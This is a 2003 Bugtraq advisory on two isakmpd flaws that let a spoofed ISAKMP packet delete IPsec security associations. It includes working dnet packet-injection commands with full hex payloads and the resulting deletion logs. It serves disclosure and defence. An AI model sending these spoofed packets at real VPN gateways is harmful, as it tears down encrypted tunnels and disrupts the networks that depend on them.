@@ -1,0 +1,172 @@
+
+Date: Wed, 31 Dec 2003 23:38:58 +0100
+From: Thomas Walpuski <thomas@...nknerd.de>
+To: bugtraq@...urityfocus.com
+Subject: multiple payload handling flaws in isakmpd, again
+
+
+0 Preface
+
+  On 2003/11/06 a bug fix for a payload handling flaw in isakmpd
+  described in http://securityfocus.com/archive/1/343173 was committed
+  to CVS. Other payload handling flaws, which were not presented on a
+  silver platter, but only mentioned in side notes, still remain
+  unfixed.
+
+  This posting will point out two other payload handling flaws in
+  isakmpd, which can be exploited with an ease. It's meant to put
+  pressure on the developers of IKE daemons to review their software,
+  which might become crucial in the future.
+
+1 Abstract
+
+  isakmpd, OpenBSD's IKE daemon, contains some payload handling flaws,
+  which allow for unauthorized deletion of IPsec SAs.
+
+2 Description
+
+  2.1 isakmpd's weird reaction upon receipt of INVALID-SPI notifications
+
+    On receipt of an INVALID-SPI notification, isakmpd deletes the
+    IPsec SA referred to by the SPI contained in the notification data
+    and all "associated" IPsec SAs, if the ISAKMP message originates
+    from the right IP address. See section 4.1, RFC 2408 section 5.5 and
+    ipsec.c for further details.
+
+    Nota Bene: This reaction upon receipt of an INVALID-SPI notification
+    is complete nonsense. Please, take a look at the RFC.
+
+  2.2 isakmpd accepting INITIAL-CONTACT nearly everywhere
+
+    When isakmpd receives an INITIAL-CONTACT notification chained to
+    other "reasonable" payload, it deletes all IPsec SAs pointing to the
+    source IP address of the ISAKMP message and all "associated" IPsec
+    SAs. isakmpd ignores INITIAL-CONTACT notifications sent in a
+    informational exchange. See section 4.2, RFC 2407 section 4.6.3.3
+    and ipsec.c for further details.
+
+3 Affected Systems
+
+  All versions of isakmpd are affected. Other well known free IKE
+  daemons are not affected.
+  
+  Commercial IKE daemons might also be affected. I don't know. You want
+  to provide access to commercial IKE daemons? Contact me!
+
+4 Leveraging the Issues ..
+
+  The following scenario is assumed. There are two VPN gateways vpn-gw-a
+  and vpn-gw-b, which have established a IPsec tunnel. The attacker
+  tries to trigger unauthorized deletion of IPsec SAs on vpn-gw-a
+
+    .. ---[ vpn-gw-a ]------[ vpn-gw-b ]--- ..
+        \========= IPsec tunnel =========/
+
+  4.1 .. using INVALID-SPI
+
+    Someone starts isakmpd on vpn-gw-a:
+
+      vpn-gw-a# isakmpd -d -DA=30
+      
+    vpn-gw-a and vpn-gw-b establish a IPsec tunnel using IKE. The IKE
+    daemons install appropriate IPsec SAs (and policies):
+    
+      vpn-gw-a# cat /kern/ipsec | grep SPI 
+      SPI = 53fc575b, Destination = <vpn-gw-b's IP address>, Sproto = 50
+      SPI = 01627f3c, Destination = <vpn-gw-a's IP address>, Sproto = 50
+
+    The attacker does some network sniffing to learn the SPI of IPsec SA
+    pointing to vpn-gw-b (that's quite easy, because it's contained in
+    the AH/ESP header) and injects his "deadly" packet:
+
+      attacker# dnet hex \
+      >   "\x00\x00\x00\x00" \
+      >   "\x00\x00\x00\x00" \
+      >   "\x00\x00\x00\x00" \
+      >   "\x00\x00\x00\x00" \
+      >   "\x0b\x10\x05\x00" \
+      >   "\x00\x00\x00\x00" \
+      >   "\x00\x00\x00\x2c" \
+      >     "\x00\x00\x00\x10" \
+      >     "\x00\x00\x00\x01" \
+      >     "\x03\x00\x00\x0b" \
+      >     "\x53\xfc\x57\x5b" |
+      pipe> dnet udp sport 500 dport 500 |
+      pipe pipe> dnet ip proto udp src vpn-gw-b dst vpn-gw-a |
+      pipe pipe pipe> dnet send
+
+    Note: The example ISAKMP message is complete crap, but it seems to
+    be good enough for isakmpd :-/.
+
+    isakmpd automagically deletes the IPsec SAs ..:
+
+      vpn-gw-a# # cat /kern/ipsec 
+      Hashmask: 31, policy entries: 0
+
+    .. and informs you about it:
+
+      075542.992984 Exch 10 ipsec_responder: got NOTIFY of type INVALID_SPI
+      075543.000662 SA   30 ipsec_delete_spi_list: INVALID_SPI made us delete SA 0x1b1600 (3 references) for proto 0
+
+  4.2 .. using INITIAL-CONTACT 
+
+    This attack is much easier. Really.
+
+    Again an IPsec tunnel is established:
+   
+      vpn-gw-a# cat /kern/ipsec | grep SPI 
+      SPI = 1d4f3865, Destination = <vpn-gw-a's IP address>, Sproto = 50
+      SPI = f7b3944c, Destination = <vpn-gw-b's IP address>, Sproto = 50
+
+    The attacker injects an ISAKMP message pretending to initiate a Main
+    Mode exchange between vpn-gw-b and vpn-gw-a with an INITIAL-CONTACT
+    notification chained to it:
+
+      attacker# dnet hex \
+      >   "\x17\x17\x17\x17" \
+      >   "\x17\x17\x17\x17" \
+      >   "\x00\x00\x00\x00" \
+      >   "\x00\x00\x00\x00" \
+      >   "\x01\x10\x02\x00" \
+      >   "\x00\x00\x00\x00" \
+      >   "\x00\x00\x00\x54" \
+      >     "\x0b\x00\x00\x2c" \
+      >     "\x00\x00\x00\x01" \
+      >     "\x00\x00\x00\x01" \
+      >        "\x00\x00\x00\x20" \
+      >        "\x01\x01\x00\x01" \
+      >          "\x00\x00\x00\x18" \
+      >          "\x01\x01\x00\x00" \
+      >          "\x80\x01\x00\x05" \
+      >          "\x80\x02\x00\x02" \
+      >          "\x80\x03\x00\x03" \
+      >          "\x80\x04\x00\x02" \
+      >     "\x00\x00\x00\x0c" \
+      >     "\x00\x00\x00\x01" \
+      >     "\x01\x00\x60\x02" |
+      pipe> dnet udp sport 500 dport 500 |
+      pipe pipe> dnet ip proto udp src vpn-gw-b dst vpn-gw-a |
+      pipe pipe pipe> dnet send
+
+    If the isakmpd finds a acceptable proposal in message injected by
+    the attacker, it tries to advance the exchange and deletes all IPsec
+    SAs pointing to vpn-gw-b and all "associated" IPsec SAs ..:
+ 
+      vpn-gw-a# cat /kern/ipsec            
+      Hashmask: 31, policy entries: 0
+
+    .. and does some logging:
+
+      081412.393202 SA   30 ipsec_handle_leftover_payload: INITIAL-CONTACT made us delete SA 0x1b1600
+      081412.399786 SA   30 ipsec_handle_leftover_payload: INITIAL-CONTACT made us delete SA 0x1b1200
+
+    Nota Bene: You can include a large proposal payload with all
+    possible transforms, so isakmpd will find one acceptable.
+
+5 Bug fixes
+
+  There are no bug fixes.
+
+Thomas Walpuski
+
+
